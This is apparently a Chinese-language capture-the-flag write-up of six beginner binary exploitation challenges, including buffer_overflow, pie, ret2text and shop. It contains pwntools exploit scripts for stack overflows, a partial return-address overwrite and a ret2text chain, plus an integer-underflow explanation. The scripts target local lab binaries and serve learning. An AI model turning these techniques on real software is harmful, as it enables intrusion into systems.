# buffer_overflow

![[Pasted image 20250115091055.png]]
反编译后可以看出当`local_62`与`ans`中的内容一样是就可以获取`flag`。
![[Pasted image 20250115091300.png]]
可以看到ans的内容
![[Pasted image 20250115091337.png]]
打开gdb调试可以看到`local_62`内内容的位置，构造`payload`将其覆盖为`ans`内容即可。
exp:
```python
from pwn import *

  

local = True

if local:

p = process("./buffer_overflow")

pwnlib.gdb.attach(p, 'b *main')

else:

pass

  

payload = b'a' * 0x46 + b'Limiter and Wings are beautiful girls!'

p.send(payload)

p.interactive()
```
flag:
![[Pasted image 20250115091529.png]]
# game

![[Pasted image 20250115092751.png]]
反编译后可以看出当local_14累加到999后就可以获取shell。
exp:
```python
from pwn import *

  

context(os="linux", arch="amd64", log_level="debug")

local = True

if local:

p = process("./game")

# pwnlib.gdb.attach(p, 'b *main')

else:

pass

  

num = 0

# p.recvuntil(b"Let's paly a game!")

while num<=999:

p.sendlineafter(b'pls input you num:', b'9')

num += 9

p.interactive()
```
flag:
![[Pasted image 20250115092855.png]]
# pie
开启了pie保护
![[Pasted image 20250115100232.png]]![[Pasted image 20250115100243.png]]
栈溢出仅能覆盖返回地址的一位，显然是将其覆盖为backdoor。
exp：
```python
from pwn import *

  

context(os="linux", arch="amd64", log_level="debug")

local = True

if local:

p = process("./pie")

# pwnlib.gdb.attach(p, 'b *main')

else:

pass

  

pwnlib.gdb,attach(p)

payload = b'a' * 0x28 + b'd'

p.sendline(payload)

p.interactive()
```
shell:
![[Pasted image 20250115100413.png]]
# real_login
![[Pasted image 20250115100541.png]]
当输入为password时获取shell
![[Pasted image 20250115100606.png]]
password如上
shell：
![[Pasted image 20250115100635.png]]
# ret2text
取名为ret2text则大概率有后门函数
![[Pasted image 20250116145056.png]]
有明显的栈溢出漏洞，找找后门函数
![[Pasted image 20250116145124.png]]
action不是CET-4 word所以他是后门函数~~找了半天~~ 
exp:
```python
from pwn import *

  

context(os="linux", arch="amd64", log_level="debug")

local = True

if local:

p = process("./ret2text")

pwnlib.gdb.attach(p, 'b *main')

else:

pass

  

# rbp = 0x4011fd

ret = 0x40101a

backdoor = 0x4014ba

  

payload = b'a' * 0x48 + p64(ret) + p64(backdoor)

p.recvuntil("Make a wish: ")

p.sendline(payload)

p.interactive()
```
shell:
![[Pasted image 20250116145301.png]]
# shop
运行后发现是一个简单的商店程序。
反编译后发现程序都没有明显的漏洞。
![[Pasted image 20250115155103.png]]
根据提示会告知我们为整数漏洞。
那么最明显的就是让我们的钱变为负数来触发漏洞。
正常的购买都会判断钱是否足够再扣钱，但选项3则会无条件扣除50.
![[Pasted image 20250115155212.png]]
那么只需要让拥有的钱数少于50后触发选项3就能触发整数漏洞。
![[Pasted image 20250115155407.png]]
可以看到初始钱数为0x64即100。
获取shell：
![[Pasted image 20250115155516.png]]